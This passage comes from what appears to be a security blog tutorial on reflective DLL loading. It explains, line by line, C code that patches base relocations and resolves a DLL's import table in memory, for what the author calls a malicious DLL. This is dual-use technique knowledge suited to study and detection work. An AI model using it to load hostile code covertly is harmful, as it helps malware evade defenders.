srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=e685e5f12510875f9432316fe4c24b44, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=24cc7d2825c12ca4b1f565a6b652d91e 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=71fd5c06b071449ba191a0f8281525ab, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=2cadb731ffbb96eba228224be39cdbce 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=c6b461aa1228a9a7c34dd3b8e7edfba4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367420&amp;s=17c00f43e227ed146169126417503dc7 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=4d9b3f6015176ec1f4385785cb55f9ff, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=afb144ef16c99f4d236e9be05e7f7581 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367420&amp;s=4d9b3f6015176ec1f4385785cb55f9ff" loading="lazy" x-data="image({mq1024:{width:936,height:478},mq768:{width:936,height:478},mq320:{width:720,height:368},DEFAULT:{width:319,height:163}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="478" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 9 - PE Headers IMAGE_SECTION_HEADER</figcaption></figure></div><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 60-95: In this section, we will patch all the relocation addresses with the location that was returned by the VirtualAlloc.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 60: Parse the OptionalHeader strut to get access to the <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2577">IMAGE_DATA_DIRECTORY</a> structure that holds the offset to the relocation Table structure. In Figure 10, The highlighted Blue and Red squares represent the IMAGE_DATA_DIRECTORY</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 62: Gets a pointer to the relocation table by adding the VirtualAddress from the IMAGE_DATA_DIRECTORY to the base address.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 65: Loop until the current size of processed relocation blocks is less than the size listed in the IMAGE_DATA_DIRECTORY struct shown in Red in Figure 10. In this example, the size is zero and the loop is skipped.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 67 - 72: Uses the relocation table pointer to find the next relocation block, then increments the processed count. Next, we calculate the <a href="https://github.com/hasherezade/demos/blob/master/chimera_pe/src/relocate.h#L8">BASE_RELOCATION_ENTRY</a> by adding the Relocation Table pointer to the relocations size that we’ve processed.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 74 - 93: Loops through the BASE_RELOCATION_ENTRY structure to update all pointers that are not of type 0.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 84: Gets the address offset of the memory location that needs to be edited.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 87: Reads the value of that address and stores it in the addressToPatch.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 90: Adds the addressToPatch value to the delta offset calculated on Line 41.</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 91 Writes the new value back into the original spot.</p><pre><code data-highlighted="yes" class="hljs language-yaml"><span class="hljs-attr">0059:</span>     <span class="hljs-string">//</span> <span class="hljs-string">perform</span> <span class="hljs-string">image</span> <span class="hljs-string">base</span> <span class="hljs-string">relocations</span>
<span class="hljs-attr">0060:</span>     <span class="hljs-string">IMAGE_DATA_DIRECTORY</span> <span class="hljs-string">relocations</span> <span class="hljs-string">=</span>
<span class="hljs-attr">0061:</span>         <span class="hljs-string">ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span>
<span class="hljs-attr">0062:</span>     <span class="hljs-string">DWORD_PTR</span> <span class="hljs-string">relocationTable</span> <span class="hljs-string">=</span> <span class="hljs-string">relocations.VirtualAddress</span> <span class="hljs-string">+</span> <span class="hljs-string">(DWORD_PTR)dllBase;</span>
<span class="hljs-attr">0063:</span>     <span class="hljs-string">DWORD</span> <span class="hljs-string">relocationsProcessed</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
<span class="hljs-attr">0064:</span> 
<span class="hljs-attr">0065:</span>     <span class="hljs-string">while</span> <span class="hljs-string">(relocationsProcessed</span> <span class="hljs-string">&lt;</span> <span class="hljs-string">relocations.Size)</span>
<span class="hljs-attr">0066:</span>     {
<span class="hljs-attr">0067:</span>         <span class="hljs-string">PBASE_RELOCATION_BLOCK</span> <span class="hljs-string">relocationBlock</span> <span class="hljs-string">=</span> <span class="hljs-string">(PBASE_RELOCATION_BLOCK)(</span>
<span class="hljs-attr">0068:</span>                 <span class="hljs-string">relocationTable</span> <span class="hljs-string">+</span> <span class="hljs-string">relocationsProcessed);</span>
<span class="hljs-attr">0069:</span>         <span class="hljs-string">relocationsProcessed</span> <span class="hljs-string">+=</span> <span class="hljs-string">sizeof(BASE_RELOCATION_BLOCK);</span>
<span class="hljs-attr">0070:</span>         <span class="hljs-string">DWORD</span> <span class="hljs-string">relocationsCount</span> <span class="hljs-string">=</span> <span class="hljs-string">(relocationBlock-&gt;BlockSize</span> <span class="hljs-bullet">-</span> <span class="hljs-string">sizeof(</span>
<span class="hljs-attr">0071:</span>                                       <span class="hljs-string">BASE_RELOCATION_BLOCK))</span> <span class="hljs-string">/</span> <span class="hljs-string">sizeof(BASE_RELOCATION_ENTRY);</span>
<span class="hljs-attr">0072:</span>         <span class="hljs-string">PBASE_RELOCATION_ENTRY</span> <span class="hljs-string">relocationEntries</span> <span class="hljs-string">=</span> <span class="hljs-string">(PBASE_RELOCATION_ENTRY)(</span>
<span class="hljs-attr">0073:</span>                 <span class="hljs-string">relocationTable</span> <span class="hljs-string">+</span> <span class="hljs-string">relocationsProcessed);</span>
<span class="hljs-attr">0074:</span> 
<span class="hljs-attr">0075:</span>         <span class="hljs-string">for</span> <span class="hljs-string">(DWORD</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-string">relocationsCount;</span> <span class="hljs-string">i++)</span>
<span class="hljs-attr">0076:</span>         {
<span class="hljs-attr">0077:</span>             <span class="hljs-string">relocationsProcessed</span> <span class="hljs-string">+=</span> <span class="hljs-string">sizeof(BASE_RELOCATION_ENTRY);</span>
<span class="hljs-attr">0078:</span> 
<span class="hljs-attr">0079:</span>             <span class="hljs-string">if</span> <span class="hljs-string">(relocationEntries</span>[<span class="hljs-string">i</span>]<span class="hljs-string">.Type</span> <span class="hljs-string">==</span> <span class="hljs-number">0</span><span class="hljs-string">)</span>
<span class="hljs-attr">0080:</span>             {
<span class="hljs-attr">0081:</span>                 <span class="hljs-string">continue;</span>
<span class="hljs-attr">0082:</span>             }
<span class="hljs-attr">0083:</span> 
<span class="hljs-attr">0084:</span>             <span class="hljs-string">DWORD_PTR</span> <span class="hljs-string">relocationRVA</span> <span class="hljs-string">=</span> <span class="hljs-string">relocationBlock-&gt;PageAddress</span> <span class="hljs-string">+</span>
<span class="hljs-attr">0085:</span>                                       <span class="hljs-string">relocationEntries</span>[<span class="hljs-string">i</span>]<span class="hljs-string">.Offset;</span>
<span class="hljs-attr">0086:</span>             <span class="hljs-string">DWORD_PTR</span> <span class="hljs-string">addressToPatch</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
<span class="hljs-attr">0087:</span>             <span class="hljs-string">ReadProcessMemory(GetCurrentProcess()</span>,
<span class="hljs-attr">0088:</span>                               <span class="hljs-string">(LPCVOID)((DWORD_PTR)dllBase</span> <span class="hljs-string">+</span> <span class="hljs-string">relocationRVA)</span>, <span class="hljs-string">&amp;addressToPatch</span>,
<span class="hljs-attr">0089:</span>                               <span class="hljs-string">sizeof(DWORD_PTR)</span>, <span class="hljs-literal">NULL</span><span class="hljs-string">);</span>
<span class="hljs-attr">0090:</span>             <span class="hljs-string">addressToPatch</span> <span class="hljs-string">+=</span> <span class="hljs-string">deltaImageBase;</span>
<span class="hljs-attr">0091:</span>             <span class="hljs-string">memcpy((PVOID)((DWORD_PTR)dllBase</span> <span class="hljs-string">+</span> <span class="hljs-string">relocationRVA)</span>, <span class="hljs-string">&amp;addressToPatch</span>,
<span class="hljs-attr">0092:</span>                    <span class="hljs-string">sizeof(DWORD_PTR));</span>
<span class="hljs-attr">0093:</span>         }
<span class="hljs-attr">0094:</span>     }
<span class="hljs-attr">0095:</span> </code></pre><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=29b1788b4adca3747d7c6aa69c4fe267, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=5f859fccb3ee8fbb28f252d51493317d 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=470dc8e787db120b9a7cd63b3d37569c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=96859236b22b785411e9ab2edccbe213 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=8b67223b17df463db6c4220767e44d24, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=5f859fccb3ee8fbb28f252d51493317d 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=e75609633ec5f87f0c5c4d1d60c56607, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=96859236b22b785411e9ab2edccbe213 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=f14b336c8d19b6cedb17768624a20655, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=e2b0dcfcfea43b8a036bd18af89ba3d8 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=073ed7289210fc67f1210e253a0796ea, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=d8cc6adedf0918fe42b0a2f52a63d711 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=6d28b6a1e3d15064186d14cbe5d811d7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367421&amp;s=77e8d6397d89ef9a71ec64249b742ad8 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=f699def29e9bc6ab2ebf7d84a1f17179, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=73f873885eb9820a8a8f66c79e3d43c0 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig10_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367421&amp;s=f699def29e9bc6ab2ebf7d84a1f17179" loading="lazy" x-data="image({mq1024:{width:936,height:338},mq768:{width:936,height:338},mq320:{width:720,height:260},DEFAULT:{width:320,height:116}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="338" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 10 - PE Header Relocations</figcaption></figure></div><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 96 - 135: This section parses the DLLs Import Table and loads into memory any dependencies.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 98: Set a pointer to the IMAGE_DATA_DIRCTORY that contains the import data. Data structure. Offset IMAGE_DIRECTORY_ENTRY_IMPORT which is the second structure in the array of IMAGE_DATA_DIRCTORY structures. This structure is highlighted in Red in Figure11.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 99: Uses the directory data structure from line 98 to calculate the address of the <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2978">IMAGE_IMPORT_DESCRITPOR</a> structure.&nbsp; 0x180000000+0x21B8. See the highlighted Red section of Figure 11 for the IMAGE_IMPORT_DESCRIPTOR structure.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 105: Iterates through the Names of the import Descriptor until it fails to find another. These names are the names of the DLL to be loaded. In our example, the only one is Kernel32.dll. The calculation to derive the Name is shown highlighted in Blue in Figure 11. The virtual address highlighted at 0x1800031c4, when added to the base address of 0x180000000 + 0x233a, is the address highlighted at 0x18000233a which is the ASCII for Kernel32.dll.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 108: LoadLibraryA is then used to load this common Windows DLL into memory if is not already loaded and returns the address of the library in memory.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 115 - 131: Iterates through the list of functions within the loaded library that are used in our malicious DLL and updates the addresses.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 113: Stores the address of the First <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-tools/widl/include/winnt.h#L2957">IMAGE_THUNK_DATA</a>. This is a union structure so it can hold multiple values in the same memory location.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 115: Loops if the virtual address of the data is not empty.</p><p class="MsoListParagraphCxSpMiddle">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 117 - 121: Process the Thunk if it’s of the ordinal type. This is when it’s referenced with an index value rather than an ASCII name.</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 123 - 128: Process the thunk and save the updated address of the function if the Thunk uses the file name. Shown highlighted in Orange in Figure 12 is the Linked process. First, the offset is retrieved from 0x1800021b0, which points to the first Thunk, at 0x1800021e0. This structure then contains the offset, 0x2250, which points to the ASCII string located. 0x180002250 “CloseHandle”</p><pre><code data-highlighted="yes" class="hljs language-yaml"><span class="hljs-attr">0096:</span>     <span class="hljs-string">//</span> <span class="hljs-string">resolve</span> <span class="hljs-string">import</span> <span class="hljs-string">address</span> <span class="hljs-string">table</span>
<span class="hljs-attr">0097:</span>     <span class="hljs-string">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="hljs-string">importDescriptor</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">;</span>
<span class="hljs-attr">0098:</span>     <span class="hljs-string">IMAGE_DATA_DIRECTORY</span> <span class="hljs-string">importsDirectory</span> <span class="hljs-string">=</span>
<span class="hljs-attr">0099:</span>         <span class="hljs-string">ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span>
<span class="hljs-attr">0100:</span>     <span class="hljs-string">importDescriptor</span> <span class="hljs-string">=</span> <span class="hljs-string">(PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress</span>
<span class="hljs-attr">0101:</span>                        <span class="hljs-string">+</span> <span class="hljs-string">(DWORD_PTR)dllBase);</span>
<span class="hljs-attr">0102:</span>     <span class="hljs-string">LPCSTR</span> <span class="hljs-string">libraryName</span> <span class="hljs-string">=</span> <span class="hljs-string">""</span><span class="hljs-string">;</span>
<span class="hljs-attr">0103:</span>     <span class="hljs-string">HMODULE</span> <span class="hljs-string">library</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">;</span>
<span class="hljs-attr">0104:</span> 
<span class="hljs-attr">0105:</span>     <span class="hljs-string">while</span> <span class="hljs-string">(importDescriptor-&gt;Name</span> <span class="hljs-type">!=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">)</span>
<span class="hljs-attr">0106:</span>     {
<span class="hljs-attr">0107:</span>         <span class="hljs-string">libraryName</span> <span class="hljs-string">=</span> <span class="hljs-string">(LPCSTR)importDescriptor-&gt;Name</span> <span class="hljs-string">+</span> <span class="hljs-string">(DWORD_PTR)dllBase;</span>
<span class="hljs-attr">0108:</span>         <span class="hljs-string">library</span> <span class="hljs-string">=</span> <span class="hljs-string">LoadLibraryA(libraryName);</span>
<span class="hljs-attr">0109:</span> 
<span class="hljs-attr">0110:</span>         <span class="hljs-string">if</span> <span class="hljs-string">(library)</span>
<span class="hljs-attr">0111:</span>         {
<span class="hljs-attr">0112:</span>             <span class="hljs-string">PIMAGE_THUNK_DATA</span> <span class="hljs-string">thunk</span> <span class="hljs-string">=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">;</span>
<span class="hljs-attr">0113:</span>             <span class="hljs-string">thunk</span> <span class="hljs-string">=</span> <span class="hljs-string">(PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase</span> <span class="hljs-string">+</span> <span class="hljs-string">importDescriptor-&gt;FirstThunk);</span>
<span class="hljs-attr">0114:</span> 
<span class="hljs-attr">0115:</span>             <span class="hljs-string">while</span> <span class="hljs-string">(thunk-&gt;u1.AddressOfData</span> <span class="hljs-type">!=</span> <span class="hljs-literal">NULL</span><span class="hljs-string">)</span>
<span class="hljs-attr">0116:</span>             {
<span class="hljs-attr">0117:</span>                 <span class="hljs-string">if</span> <span class="hljs-string">(IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span>
<span class="hljs-attr">0118:</span>                 {
<span class="hljs-attr">0119:</span>                     <span class="hljs-string">LPCSTR</span> <span class="hljs-string">functionOrdinal</span> <span class="hljs-string">=</span> <span class="hljs-string">(LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span>
<span class="hljs-attr">0120:</span>                     <span class="hljs-string">thunk-&gt;u1.Function</span> <span class="hljs-string">=</span> <span class="hljs-string">(DWORD_PTR)GetProcAddress(library</span>, <span class="hljs-string">functionOrdinal);</span>
<span class="hljs-attr">0121:</span>                 }
<span class="hljs-attr">0122:</span>                 <span class="hljs-string">else</span>
<span class="hljs-attr">0123:</span>                 {
<span class="hljs-attr">0124:</span>                     <span class="hljs-string">PIMAGE_IMPORT_BY_NAME</span> <span class="hljs-string">functionName</span> <span class="hljs-string">=</span> <span class="hljs-string">(PIMAGE_IMPORT_BY_NAME)((</span>
<span class="hljs-attr">0125:</span>                             <span class="hljs-string">DWORD_PTR)dllBase</span> <span class="hljs-string">+</span> <span class="hljs-string">thunk-&gt;u1.AddressOfData);</span>
<span class="hljs-attr">0126:</span>                     <span class="hljs-string">DWORD_PTR</span> <span class="hljs-string">functionAddress</span> <span class="hljs-string">=</span> <span class="hljs-string">(DWORD_PTR)GetProcAddress(library</span>,
<span class="hljs-attr">0127:</span>                                                 <span class="hljs-string">functionName-&gt;Name);</span>
<span class="hljs-attr">0128:</span>                     <span class="hljs-string">thunk-&gt;u1.Function</span> <span class="hljs-string">=</span> <span class="hljs-string">functionAddress;</span>
<span class="hljs-attr">0129:</span>                 }
<span class="hljs-attr">0130:</span>                 <span class="hljs-string">++thunk;</span>
<span class="hljs-attr">0131:</span>             }
<span class="hljs-attr">0132:</span>         }
<span class="hljs-attr">0133:</span> 
<span class="hljs-attr">0134:</span>         <span class="hljs-string">importDescriptor++;</span>
<span class="hljs-attr">0135:</span>     }
<span class="hljs-attr">0136:</span> </code></pre><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=cbc842bd7a705a3a1bf1cb66a0aab383, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=b8f7d482e0e08ca1be750f443ecc0a67 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=a7a309c6630149e7e822dddd7b78ec48, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=3fc8e57bd9af252b2643022949bbc326 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=54f58823798aec331a4477b72251afba, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=b8f7d482e0e08ca1be750f443ecc0a67 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=5766b286e67bd229258a1795e39864b9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=3fc8e57bd9af252b2643022949bbc326 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=87c92213e5d9b4366a60e768ac70908f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1079&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=e0d8872822c38b6432a25ee3ad538525 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=d6f6361f55493525f21cdba0d17f3d48, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=1079&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=14574a95225045b824ec7b38a2fcbb6c 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=f83670ce5a9e6edbb18e36a8baba55e4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367422&amp;s=2f77da767dc7afa80fff610ae8c4bdb4 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=10ccee98eea5fb14799412a314090133, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=37c5a4a2d9e70548e6d388d8f3fadf9a 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig11_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367422&amp;s=10ccee98eea5fb14799412a314090133" loading="lazy" x-data="image({mq1024:{width:936,height:622},mq768:{width:936,height:622},mq320:{width:719,height:478},DEFAULT:{width:320,height:213}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="622" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 11 - Import Table Offsets</figcaption></figure></div><p class="MsoNormal">The following figure shows the memory structure in Ghidra of the raw unpatched import table.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=37cb4015dd02c541d766a702385bf2d4, 